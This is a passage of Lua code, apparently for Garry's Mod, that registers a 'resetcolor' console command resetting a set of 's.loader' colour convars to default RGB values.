concommand.Add("resetcolor", function()
RunConsoleCommand("s.loader.colorchanges.11", 255)
RunConsoleCommand("s.loader.colorchanges.12", 0)
RunConsoleCommand("s.loader.colorchanges.13", 0)

RunConsoleCommand("s.loader.colorchanges.21", 103)
RunConsoleCommand("s.loader.colorchanges.22", 200)
RunConsoleCommand("s.loader.colorchanges.23", 90)

RunConsoleCommand("s.loader.colorchanges.31", 215)
RunConsoleCommand("s.loader.colorchanges.32", 215)
RunConsoleCommand("s.loader.colorchanges.33", 215)

RunConsoleCommand("s.loader.colorchanges.41", 0)
RunConsoleCommand("s.loader.colorchanges.42", 0)
RunConsoleCommand("s.loader.colorchanges.43", 0)
updatecolortextodime()

RunConsoleCommand("s.loader.colorchanges.51", 200)
RunConsoleCommand("s.loader.colorchanges.52", 200)
RunConsoleCommand("s.loader.colorchanges.53", 0)

RunConsoleCommand("s.loader.colorchanges.61", 103)
RunConsoleCommand("s.loader.colorchanges.62", 200)
RunConsoleCommand("s.loader.colorchanges.63", 90)
